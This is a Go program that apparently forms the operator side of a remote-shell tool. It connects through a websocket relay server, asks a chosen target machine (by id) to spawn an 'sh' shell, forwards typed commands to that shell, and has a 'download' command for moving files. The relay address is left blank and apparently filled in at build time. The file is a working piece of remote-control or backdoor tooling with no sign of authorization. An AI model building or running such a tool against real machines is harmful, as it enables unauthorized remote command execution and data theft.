package main

import (
	"flag"
	"fmt"
	"time"

	"github.com/gorilla/websocket"
	"net"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"github.com/op/go-logging"
	"os"
	"bufio"
	"strings"
)

// message 通讯
type wsMessage struct {
	Type	int	   `json:"type,int"`
	Sender  string `json:"sender,omitempty"`
	Target  string `json:"target,omitempty"`
	Param1	string `json:"param1,omitempty"`
	Param2	string `json:"param2,omitempty"`
	Param3	string `json:"param3,omitempty"`
}

var targetID = flag.String("id", "", "target id")
var log = logging.MustGetLogger("goserver")
var format = logging.MustStringFormatter(
	//`%{time:15:04:05.000} %{shortfunc} > %{level:s} %{message}`,
	`%{time:15:04:05.000} > %{message}`,
)
var connectString = ""

func getLoaclMac() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		panic("Error : " + err.Error())
	}
	for _, inter := range interfaces {
		mac := inter.HardwareAddr //获取本机MAC地址
		if (inter.Flags & net.FlagUp) == net.FlagUp {
			if (inter.Flags & net.FlagLoopback) != net.FlagLoopback {
				//fmt.Printf("MAC = %s(%s)\r\n", mac, inter.Name)
				return string(mac)
			}
		}
	}

	return ""
}

func getClientId() string {
	clientId := getLoaclMac()
	h := md5.New()
	h.Write([]byte(clientId))
	cipherStr := h.Sum(nil)
	return hex.EncodeToString(cipherStr)
}

func main() {
	if len(connectString)==0 {
		os.Exit(0)
	}

	// 用户参数
	flag.Parse()

	if *targetID == "" {
		flag.PrintDefaults()
		os.Exit(0)
	}

	var clientUID string
	var targetUID string

	// init log config
	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format)
	logging.SetBackend(backend2Formatter)

	//u := url.URL{Scheme: "ws", Host: connectString}
	var dialer *websocket.Dialer

	conn, _, err := dialer.Dial(connectString, nil)
	if err != nil {
		fmt.Println(err)
		return
	}

	// 1.等待服务器返回本次通讯的临时ID
	_, messageData, err := conn.ReadMessage()
	if err != nil {
		log.Debug("read:", err)
		return
	}

	message := &wsMessage{}
	err = json.Unmarshal([]byte(messageData), message)
	if err != nil {
		log.Debug("json error", err.Error())
	}
	if message.Type == 102 {
		clientUID = message.Sender
		log.Debug("login ok", clientUID)
	} else {
		log.Debug("login error")
		os.Exit(0)
	}

	// 2.请求Target创建shell
	log.Debug("query target shell")
	message = &wsMessage{
		Type:	103,
		Sender:	clientUID,
		Target: *targetID,
		Param1: "sh",
	}

	sendData, _ := json.Marshal(message)
	conn.WriteMessage(websocket.TextMessage, sendData)
	_, messageData, err = conn.ReadMessage()
	if err != nil {
		log.Debug("read:", err)
		return
	}
	message = &wsMessage{}
	err = json.Unmarshal([]byte(messageData), message)
	if err != nil {
		log.Debug("json error", err.Error())
	}
	if message.Type == 101 {
		targetUID = message.Sender
	} else {
		log.Debug("target error")
		os.Exit(0)
	}
	log.Debug("create OK")

	// 等待返回
	go func() {
		for {
			_, messageData, err := conn.ReadMessage()
			if err != nil {
				fmt.Println("read:", err)
				return
			}

			message := &wsMessage{}
			err = json.Unmarshal([]byte(messageData), message)
			if err != nil {
				log.Debug("json error", err.Error())
			}
			if message.Type == 201 {
				log.Debug(message.Param1)
			}
		}
	}()

	// 等待用户输入
	for {
		inputReader := bufio.NewReader(os.Stdin)
		input, _ := inputReader.ReadString('\n')
		inputString := strings.Trim(input, "\r\n")

		// 判断命令
		s := strings.Split(inputString, " ")
		if s[0] == "download" {
			// 命令
			message := &wsMessage{
				Type:	202,
				Sender: clientUID,
				Target: targetUID,
				Param1: s[1],
				Param2: s[2],
			}

			sendData, _ := json.Marshal(message)
			conn.WriteMessage(websocket.TextMessage, sendData)

		} else {
			// 命令
			message := &wsMessage{
				Type:	201,
				Sender: clientUID,
				Target: targetUID,
				Param1: inputString+"\n",
			}

			sendData, _ := json.Marshal(message)
			conn.WriteMessage(websocket.TextMessage, sendData)
		}
	}
}

func sendData(conn *websocket.Conn, targetID string, msg string)  {
	message := &wsMessage{
		Type:	201,
		Target: targetID,
		//Target: "7f00000109c400000005",
		Param1: msg,
	}

	sendData, _ := json.Marshal(message)
	conn.WriteMessage(websocket.TextMessage, sendData)
}

func loginWriter(conn *websocket.Conn, cliendID string)  {
	message := &wsMessage{
		Type:	102,
		Sender: "cliendID",
	}

	sendData, _ := json.Marshal(message)
	conn.WriteMessage(websocket.TextMessage, sendData)
}

func timeWriter(conn *websocket.Conn) {
	for {
		time.Sleep(time.Second * 2)
		conn.WriteMessage(websocket.TextMessage, []byte(time.Now().Format("2006-01-02 15:04:05")))
	}
}